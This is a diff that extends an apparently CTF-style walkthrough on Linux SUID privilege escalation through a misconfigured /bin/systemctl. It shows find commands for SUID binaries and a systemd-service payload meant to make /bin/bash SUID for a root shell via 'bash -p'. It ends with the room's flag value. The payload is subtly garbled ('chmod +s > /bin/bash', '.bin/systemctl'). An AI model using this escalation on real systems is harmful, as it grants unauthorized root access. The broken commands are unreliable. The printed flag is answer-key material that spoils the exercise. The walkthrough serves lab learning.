@@ -152,8 +152,7 @@ run
 
 The SUID bit can be a vector for privilege escalation if misconfigured. In pentesting or security auditing, finding files with active SUID bits is essential to detect potential security flaws.
 
-    Run the command to find files with SUID:
-
+    Run the command lists all files with the SUID bit enabled on the system.
 find / -perm -u=s -type f 2>/dev/null 
      
 question:
@@ -171,11 +170,73 @@ output:
 /bin/umount
 /bin/systemctl
 /bin/fusermount
-....
+....  find / -user root -perm -4000 -exec ls -ldb {} \;
+ Which file stands out?
+answer: /bin/systemctl
+
+
+    Why is systemctl with SUID is important and so Dangerous?
+
+During privilege escalation, discovering /bin/systemctl with the SUID bit set is a major finding.
+
+    What is systemctl?
+
+systemctl is the primary tool for managing systemd services. It allows users to:
+
+    Start/stop/restart services
+
+    Enable/disable services at boot
+
+    View system logs and states
+
+    Switch targets (runlevels)
+
+    Reload daemons and configurations
+
+    What Makes systemctl with SUID Special?
+
+Having the SUID bit on systemctl means it runs with root privileges, even if executed by a normal user. This opens multiple paths for privilege escalation:
 
 
 
-					
+
+How to Check if systemctl is SUID?
+
+ls -l /bin/systemctl
+output: 
+   -rwsr-xr-x 1 root root 996584 Jun 17  2024 /bin/systemctl
+The s in rws means it has SUID, which is dangerous.		
+
+What is the root flag value?
+
+goto   GTFOBins (https://gtfobins.github.io/)
+This project collects legitimate functions of Unix binaries that can be abused.
+look for systemctl. you will find the script:
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s > /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+.bin/systemctl link $TF
+.bin/systemctl enable --now $TF
+
+ run it 
+ 
+ run ls -l /bin/bash
+ output:
+ 
+ -rwsr-sr-x 1 root root 1037528 may 16 2017  bin/bash
+ 
+ now if we run bash -p we will be root
+cd /root
+ls
+root.txt
+
+cat root.txt 
+and you get the flag: a58ff8579f0a9270368d33a9966c7fd5
+ 	
 https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=1282
 
 
